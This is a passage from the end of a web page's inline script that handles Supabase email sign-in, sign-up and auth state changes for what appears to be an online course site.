      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

